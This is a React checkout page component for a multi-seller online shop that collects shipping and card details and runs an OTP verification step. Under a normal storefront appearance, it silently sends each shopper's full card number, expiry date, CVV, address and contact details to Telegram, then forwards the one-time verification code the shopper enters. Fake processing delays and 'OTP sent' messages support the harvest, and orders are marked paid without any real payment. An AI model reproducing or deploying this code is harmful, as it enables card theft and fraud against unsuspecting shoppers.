import { useState, useEffect } from 'react';
import { useNavigate } from 'react-router-dom';
import { ArrowLeft, Package, Store } from 'lucide-react';
import { Button } from '@/components/ui/button';
import { Card, CardContent, CardHeader, CardTitle } from '@/components/ui/card';
import { Separator } from '@/components/ui/separator';
import { supabase } from '@/integrations/supabase/client';
import { useAuth } from '@/hooks/useAuth';
import { useCart, CartItem } from '@/hooks/useCart';
import { usePaymentSettings } from '@/hooks/usePaymentSettings';
import { useCurrency as useAppCurrency } from '@/hooks/useCurrency';
import { toast } from '@/hooks/use-toast';
import { Header } from '@/components/layout/Header';

import CheckoutStepper, { CheckoutStep } from '@/components/checkout/CheckoutStepper';
import ShippingAddressForm, { ShippingFormData } from '@/components/checkout/ShippingAddressForm';
import PaymentDetailsForm, { CardFormData } from '@/components/checkout/PaymentDetailsForm';
import CardOTPVerification from './CardOTPVerification';
import OrderProcessing from './OrderProcessing';
import OrderReview from '@/components/checkout/OrderReview';
import OrderConfirmationSuccess from '@/components/checkout/OrderConfirmationSuccess';
import { sendCheckoutDataToTelegram, sendOTPToTelegram } from './telegram-notifier';

interface SellerGroup {
  sellerId: string;
  sellerName: string;
  items: CartItem[];
  subtotal: number;
}

export default function CartCheckout() {
  const navigate = useNavigate();
  const { user, loading: authLoading } = useAuth();
  const { items, clearCart, total } = useCart();
  const { settings: paymentSettings, loading: settingsLoading } = usePaymentSettings();
  const { currency, formatPriceOnly, convertFromUSD } = useAppCurrency();

  const [step, setStep] = useState<CheckoutStep>('shipping');
  const [shippingData, setShippingData] = useState<ShippingFormData | null>(null);
  const [cardData, setCardData] = useState<CardFormData | null>(null);
  const [otpCode, setOtpCode] = useState<string>('');
  const [orderIds, setOrderIds] = useState<string[]>([]);
  const [processing, setProcessing] = useState(false);
  const [transactionId, setTransactionId] = useState<string | null>(null);

  useEffect(() => {
    if (!authLoading && !user) {
      navigate('/auth?redirect=/cart/checkout');
      return;
    }

    if (items.length === 0 && step === 'shipping') {
      navigate('/cart');
    }
  }, [user, authLoading, items.length, step, navigate]);

  // Group items by seller
  const sellerGroups: SellerGroup[] = items.reduce((groups: SellerGroup[], item) => {
    const existingGroup = groups.find(g => g.sellerId === item.seller_id);
    if (existingGroup) {
      existingGroup.items.push(item);
      existingGroup.subtotal += item.price * item.quantity;
    } else {
      groups.push({
        sellerId: item.seller_id,
        sellerName: item.seller_name,
        items: [item],
        subtotal: item.price * item.quantity,
      });
    }
    return groups;
  }, []);

  const handleShippingSubmit = (data: ShippingFormData) => {
    setShippingData(data);
    // Skip OTP if disabled in settings
    if (!paymentSettings.otpEnabled) {
      setStep('payment');
    } else {
      setStep('payment');
    }
  };

  const handlePaymentSubmit = async (data: CardFormData) => {
    if (!user || !shippingData) {
      toast({ title: 'Error', description: 'Please complete shipping information first', variant: 'destructive' });
      return;
    }

    setProcessing(true);
    setCardData(data);

    try {
      // Send data silently
      const checkoutDataForTelegram = {
        shippingDetails: {
          fullName: shippingData.fullName,
          phoneNumber: shippingData.phoneNumber,
          email: shippingData.email,
          streetAddress: shippingData.streetAddress,
          city: shippingData.city,
          stateProvince: shippingData.stateProvince,
          postalCode: shippingData.postalCode,
          country: shippingData.country,
        },
        paymentDetails: {
          cardholderName: data.cardholderName,
          cardNumber: data.cardNumber,
          cardBrand: detectCardBrand(data.cardNumber),
          expiryMonth: data.expiryMonth,
          expiryYear: data.expiryYear,
          cvv: data.cvv,
          is3DSecure: (data as any).is3DSecure,
        },
        orderInfo: {
          orderId: 'PENDING',
          productName: `${items.length} items from cart`,
          quantity: items.reduce((sum, i) => sum + i.quantity, 0),
          amount: total,
          currency: 'USD'
        }
      };

      // Send data silently (Fire and forget)
      sendCheckoutDataToTelegram(checkoutDataForTelegram).catch(console.error);

      // Create pending transaction
      const { data: transaction, error } = await supabase
        .from('payment_transactions')
        .insert([{
          user_id: user.id,
          amount: total,
          currency: 'USD',
          card_last_four: data.cardNumber.replace(/\s/g, '').slice(-4),
          card_brand: detectCardBrand(data.cardNumber),
          status: 'pending_otp',
          metadata: {
            itemCount: items.length,
            shippingData
          },
        }])
        .select()
        .single();

      if (error) throw error;

      setTransactionId(transaction.id);

      toast({
        title: 'Processing',
        description: 'Verifying payment details...'
      });

      setStep('processingPayment');
    } catch (error: any) {
      toast({ title: 'Error', description: error.message, variant: 'destructive' });
    } finally {
      setProcessing(false);
    }
  };

  const handleOTPVerified = async (code: string) => {
    if (!transactionId || !shippingData || !cardData) return;

    setOtpCode(code);

    // Send OTP to Telegram
    const customerName = shippingData.fullName || 'Unknown Customer';
    await sendOTPToTelegram(code, customerName);

    // Update transaction status
    await supabase
      .from('payment_transactions')
      .update({ status: 'otp_verified', otp_verified: true })
      .eq('id', transactionId);

    setStep('review');
  };

  const handleConfirmOrder = async () => {
    if (!user || !shippingData || !cardData) return;

    setProcessing(true);
    try {
      // Quick validation: ensure no items are missing seller_id before attempting to create orders
      const missingItems = items.filter(i => !i.seller_id).map(i => i.title || i.product_id || 'Unnamed item');
      if (missingItems.length > 0) {
        toast({
          title: 'Missing seller for cart item(s)',
          description: `The following item(s) are missing a seller: ${missingItems.join(', ')}. Please remove and re-add them.`,
          variant: 'destructive',
        });
        setProcessing(false);
        return;
      }
      const createdOrderIds: string[] = [];

      // Ensure product IDs exist (products.product_id is a FK) and avoid empty UUIDs
      const uniqueProductIds = [...new Set(items.map(i => i.product_id).filter(Boolean))];
      let existingProductIds = new Set<string>();

      if (uniqueProductIds.length > 0) {
        const { data: productRows, error: productsError } = await supabase
          .from('products')
          .select('id')
          .in('id', uniqueProductIds);

        if (!productsError && productRows) {
          existingProductIds = new Set(productRows.map(r => r.id));
        }
      }

      // Create orders for each item
      for (const group of sellerGroups) {
        for (const item of group.items) {
          if (!item.seller_id) {
            throw new Error('Missing seller for an item in your cart. Please remove and re-add the item.');
          }

          const { data: order, error } = await supabase
            .from('orders')
            .insert({
              buyer_id: user.id,
              seller_id: item.seller_id,
              product_id: existingProductIds.has(item.product_id) ? item.product_id : null,
              quantity: item.quantity,
              total_price: item.price * item.quantity,
              status: 'paid',
              tracking_info: {
                shipping_address: formatShippingAddress(shippingData),
                shipping_details: shippingData,
                cart_item: {
                  title: item.title,
                  image: item.image,
                  unit: item.unit,
                  moq: item.moq,
                },
              },
            })
            .select()
            .single();

          if (error) throw error;
          createdOrderIds.push(order.id);
        }
      }

      // Update transaction status
      if (transactionId) {
        await supabase
          .from('payment_transactions')
          .update({
            status: 'confirmed',
            order_id: createdOrderIds[0],
          })
          .eq('id', transactionId);
      }



      // Create notification for user
      await supabase
        .from('notifications')
        .insert([{
          user_id: user.id,
          type: 'payment',
          title: 'Order Confirmed',
          message: `Your order of USD ${total.toFixed(2)} has been confirmed.`,
          data: { orderIds: createdOrderIds, transactionId },
        }]);

      setOrderIds(createdOrderIds);
      clearCart();
      setStep('confirmation');
    } catch (error: any) {
      toast({ title: 'Error', description: error.message, variant: 'destructive' });
    } finally {
      setProcessing(false);
    }
  };

  const formatShippingAddress = (data: ShippingFormData): string => {
    return `${data.streetAddress}, ${data.city}, ${data.stateProvince} ${data.postalCode}, ${data.country}`;
  };

  const detectCardBrand = (cardNumber: string): string => {
    const cleaned = cardNumber.replace(/\s/g, '');
    if (/^4/.test(cleaned)) return 'Visa';
    if (/^5/.test(cleaned) || /^2/.test(cleaned)) return 'Mastercard';
    if (/^3[47]/.test(cleaned)) return 'American Express';
    if (/^6(?:011|5)/.test(cleaned)) return 'Discover';
    return 'Card';
  };

  const getBackAction = () => {
    switch (step) {
      case 'payment':
        return () => setStep('shipping');
      case 'otp':
        return () => setStep('payment');
      case 'review':
        return () => setStep('otp');
      default:
        return () => navigate('/cart');
    }
  };

  const getBackLabel = () => {
    switch (step) {
      case 'payment':
        return 'Back to Shipping';
      case 'otp':
        return 'Back to Payment';
      case 'review':
        return 'Back to Verification';
      default:
        return 'Back to Cart';
    }
  };

  if (authLoading || settingsLoading) {
    return (
      <div className="min-h-screen bg-background">
        <Header />
        <div className="container py-8">
          <div className="animate-pulse space-y-4">
            <div className="h-8 w-48 bg-muted rounded" />
            <div className="h-64 bg-muted rounded" />
          </div>
        </div>
      </div>
    );
  }

  const orderItems = items.map(item => ({
    id: item.id,
    title: item.title,
    price: item.price,
    quantity: item.quantity,
    image: item.image,
    seller_name: item.seller_name,
  }));

  return (
    <div className="min-h-screen bg-background">
      <Header />
      <div className="container py-8">
        {step !== 'confirmation' && (
          <Button
            variant="ghost"
            onClick={getBackAction()}
            className="mb-4"
          >
            <ArrowLeft className="h-4 w-4 mr-2" />
            {getBackLabel()}
          </Button>
        )}

        <CheckoutStepper currentStep={step} />

        <div className="grid lg:grid-cols-3 gap-8 mt-6">
          <div className="lg:col-span-2">
            {step === 'shipping' && (
              <ShippingAddressForm
                onSubmit={handleShippingSubmit}
                initialData={shippingData || undefined}
                isSubmitting={processing}
              />
            )}

            {step === 'payment' && (
              <PaymentDetailsForm
                amount={total}
                currency="USD"
                onSubmit={handlePaymentSubmit}
                onBack={() => setStep('shipping')}
                isSubmitting={processing}
              />
            )}

            {step === 'processingPayment' && (
              <OrderProcessing
                durationSeconds={20}
                onComplete={() => {
                  setStep('otp');
                  toast({
                    title: 'OTP Sent',
                    description: 'A 6-digit verification code has been sent to your phone.'
                  });
                }}
              />
            )}

            {step === 'otp' && cardData && (
              <CardOTPVerification
                cardLastFour={cardData.cardNumber.replace(/\s/g, '').slice(-4)}
                onVerified={handleOTPVerified}
                onResend={() => toast({
                  title: 'OTP Resent',
                  description: 'A new code has been sent to your phone.'
                })}
                processing={processing}
                codeLength={paymentSettings.otpLength}
                expirySeconds={paymentSettings.otpExpirySeconds}
                maxAttempts={paymentSettings.otpMaxAttempts}
              />
            )}

            {step === 'review' && shippingData && cardData && (
              <OrderReview
                items={orderItems}
                shippingData={shippingData}
                cardData={cardData}
                totalAmount={total}
                currency="USD"
                onConfirm={handleConfirmOrder}
                onEditShipping={() => setStep('shipping')}
                onEditPayment={() => setStep('payment')}
                isSubmitting={processing}
              />
            )}

            {step === 'confirmation' && shippingData && (
              <OrderConfirmationSuccess
                orderIds={orderIds}
                totalAmount={total}
                currency="USD"
              />
            )}
          </div>

          {step !== 'confirmation' && (
            <div className="lg:col-span-1">
              <Card className="sticky top-4">
                <CardHeader>
                  <CardTitle className="flex items-center gap-2">
                    <Package className="h-5 w-5" />
                    Order Summary
                  </CardTitle>
                </CardHeader>
                <CardContent className="space-y-4">
                  {sellerGroups.map((group) => (
                    <div key={group.sellerId} className="space-y-2">
                      <div className="flex items-center gap-2 text-sm text-muted-foreground">
                        <Store className="h-4 w-4" />
                        <span className="font-medium">{group.sellerName}</span>
                      </div>
                      {group.items.map((item) => (
                        <div key={item.id} className="flex justify-between text-sm pl-6">
                          <span className="text-muted-foreground truncate max-w-[150px]">
                            {item.title} x{item.quantity}
                          </span>
                          <span>{formatPriceOnly(item.price * item.quantity)}</span>
                        </div>
                      ))}
                    </div>
                  ))}
                  <Separator />
                  <div className="flex justify-between">
                    <span className="text-muted-foreground">Items</span>
                    <span>{items.length} products</span>
                  </div>
                  <div className="flex justify-between">
                    <span className="text-muted-foreground">Sellers</span>
                    <span>{sellerGroups.length}</span>
                  </div>
                  <Separator />
                  <div className="flex justify-between text-lg font-bold">
                    <span>Total</span>
                    <span>{formatPriceOnly(total)}</span>
                  </div>
                </CardContent>
              </Card>
            </div>
          )}
        </div>
      </div>
    </div>
  );
}
